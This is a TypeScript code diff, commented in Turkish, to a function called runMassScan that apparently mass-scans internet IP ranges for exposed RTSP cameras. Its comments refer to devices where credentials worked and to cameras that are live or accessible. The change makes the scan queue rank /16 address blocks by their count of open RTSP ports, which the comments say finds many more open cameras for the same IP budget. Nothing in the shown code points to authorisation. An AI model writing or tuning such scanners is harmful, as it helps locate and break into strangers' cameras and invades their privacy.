@@ -438,9 +438,13 @@ export async function runMassScan(
   ipBudget = 100000,
 ): Promise<number> {
   // ADAPTİF KUYRUK: daha önce kamera/erişim veren IP'lerin bölgelerini öne al.
+  // ADAPTİF KUYRUK: öğrenme sinyali = RTSP portu AÇIK çıkmış TÜM IP'ler (532 adet),
+  // sadece cred tutan 10 tanesi DEĞİL. Ölçüm: 800k IP'de 90 açık port (%0.011) —
+  // yani yoğunluk sinyalini 50x güçlendirmek aynı 100k IP'de kat kat daha çok
+  // açık kamera bulur (kuyruk bu /16'ları öne alır).
   const hitIps = store
     .listDevices()
-    .filter((d) => d.status === 'LIVE' || d.status === 'ACCESSIBLE')
+    .filter((d) => d.protocol === 'rtsp' || d.status === 'LIVE' || d.status === 'ACCESSIBLE')
     .map((d) => d.ip);
   // C: /16 tarama sayaçları (kalıcı) — boş aralık cooldown'ı için.
   const scanCounts = new Map<number, number>();
